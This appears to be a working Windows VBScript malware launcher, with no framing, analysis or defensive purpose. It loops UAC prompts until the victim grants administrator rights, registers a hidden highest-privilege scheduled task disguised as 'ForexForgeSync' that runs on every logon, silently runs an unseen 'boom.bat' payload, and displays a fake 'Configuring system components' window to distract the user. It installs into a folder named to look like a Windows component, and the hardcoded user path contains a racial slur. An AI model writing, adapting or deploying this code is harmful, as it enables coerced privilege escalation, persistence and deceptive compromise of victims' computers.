Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' --- CONFIGURATION ---
strPath = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
strScript = strPath & "\launcher.vbs"
WshShell.CurrentDirectory = strPath

' --- STEP 1: THE PERSISTENT UAC LOOP ---
' This will keep asking for Admin until the user finally clicks "Yes"
If Not WScript.Arguments.Named.Exists("elevate") And Not WScript.Arguments.Named.Exists("task") Then
    Do
        ' We use "runas" to trigger UAC. 
        ' If the user clicks "No", an error occurs, which we catch to restart the loop.
        On Error Resume Next
        UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
        
        ' If Err.Number is 0, it means they clicked "Yes"
        If Err.Number = 0 Then Exit Do 
        On Error GoTo 0
        
        ' Short sleep to prevent CPU spike if they spam "No"
        WScript.Sleep 500 
    Loop
    WScript.Quit
End If

' --- STEP 2: ONCE "YES" IS CLICKED ---
If WScript.Arguments.Named.Exists("elevate") Then
    strTaskName = "ForexForgeSync"
    
    ' Register the task so it runs on every reboot
    strRunCmd = "wscript.exe //B """ & strScript & """ /task"
    strCreateTask = "schtasks /create /tn """ & strTaskName & """ /tr """ & strRunCmd & """ /sc onlogon /rl highest /f"
    
    WshShell.Run "cmd.exe /c " & strCreateTask, 0, True
    
    ' Run boom.bat hidden for initial setup
    If FSO.FileExists(strPath & "\boom.bat") Then
        WshShell.Run "cmd.exe /c boom.bat", 0, True
    End If
End If

' --- STEP 3: THE STICKY DISTRACTION WINDOW ---
' This runs after they click Yes, and also on every reboot via the Task Scheduler.
startTime = Timer
Do While Timer < startTime + 30
    ' Re-launches the blue window if they try to close it
    WshShell.Run "cmd.exe /c title System Configuration && color 1f && echo. && echo  Configuring system components... Please wait. && echo  Do not close this window to avoid system errors. && timeout /t 30 /nobreak > nul", 1, True
    
    If Timer < startTime + 30 Then 
        WScript.Sleep 500 
    End If
Loop

WScript.Quit
